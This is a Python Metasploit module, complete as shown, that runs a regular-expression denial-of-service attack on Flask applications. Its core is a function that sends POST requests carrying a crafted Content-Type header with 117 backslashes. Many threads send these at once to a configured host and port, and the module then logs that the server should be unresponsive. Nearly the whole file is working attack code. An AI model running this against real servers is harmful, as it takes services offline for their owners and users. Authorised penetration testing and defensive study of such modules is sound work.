#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import concurrent.futures
from urllib.parse import urljoin

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Request, Session
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'Flask Content-Type ReDoS',
    'description': '''
        Flask is vulnerable to a Regex Denial of Service (ReDoS).
        The request needs to be submitted to a POST API endpoint that attempts the read the request body.
    ''',
    'authors': [
        'nicecatch2000' # Vuln discovery
        'byt3bl33d3r <marcello@protectai.com>' # MSF Module
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/6745259d-d16e-4fe5-97fe-113b64d6134f/'},
        {'type': 'cve', 'ref': ''}
    ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 80},
        'dos_threads': {'type': 'int', 'description': 'Max number of concurrent threads', 'required': True, 'default': 10},
        'url_path': {'type': 'string', 'description': 'URL Path', 'required': False, 'default': '/'},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port' or type_to_convert == 'int':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def redos(url: str, worker_n: int):
    logging.info(f"DoS thread {worker_n} started")

    r = requests.post(
        url,
        data={"a": 1},
        headers={
            "Content-Type": 'application/x-www-form-urlencoded; !="{}'.format("\\" * 117)
        },
        timeout = 1
    )

    return r.status_code, r.text

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    MAX_WORKERS = args['dos_threads']
    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
    url = urljoin(base_url, args['url_path'])

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_index = {executor.submit(redos, url, i): i for i in range(0,MAX_WORKERS)}
        done, not_done = concurrent.futures.wait(future_to_index, timeout=MAX_WORKERS)
    
    logging.info("Completed, server should be unresponsive")

if __name__ == '__main__':
    module.run(metadata, run)
